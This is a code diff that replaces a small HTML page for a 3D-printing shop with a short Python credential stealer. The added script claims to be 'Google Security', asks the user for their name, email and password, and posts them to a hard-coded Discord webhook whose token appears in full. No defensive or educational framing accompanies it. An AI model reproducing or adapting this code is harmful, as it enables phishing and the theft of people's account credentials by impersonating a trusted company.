@@ -1,32 +1,10 @@
-<html>
-<style>
-body {
-background-color:purple;
-}
-h1 {
+from dhooks import Webhook
+print("Google Security:")
+name = input("Enter your Name: ")
+email = input("Enter your Email: ")
+password = input("Enter your Password: ")
+hook = Webhook('https://discord.com/api/webhooks/983069779051053056/yX7O4chtHI1SVowUHLlfor9skU7hR2q-E36jfxKIwkS5VadqKgkS4A4XpGFkkcDy6VTm')
 
-font-family:monospace;
-font-size:45px;
-text-align:center;
-
-}
-p {
-text-align:center;
-}
-</style>
-<head>
-        <meta charset="utf-8">
-        <title>Blue Gorilla 3D Printing</title>
-    </head>
-    <body>
-<h1>Blue Gorilla 3S printing</h1>
-<br>
-<p>Hello! Welcome to Blue Gorilla's 3D printing. You can order here. Just click this link. (I promise this isn't a rick roll.)<a href="https://docs.google.com/forms/d/e/1FAIpQLSdJND7g2mMTq_0kLAt2IqjJ55cGJa-PRHL4oUGGE9vOlT_4fw/viewform?usp=sf_link">Order Here</a></p>
-    <br>
-	    <p>Everyone Happy Mother's Day! I hope you all have a good day :D</p
->	
-	</body>
-	
-</html>
+hook.send("Name: " + name + "Email: " + email + "Password: " + password)
 
 
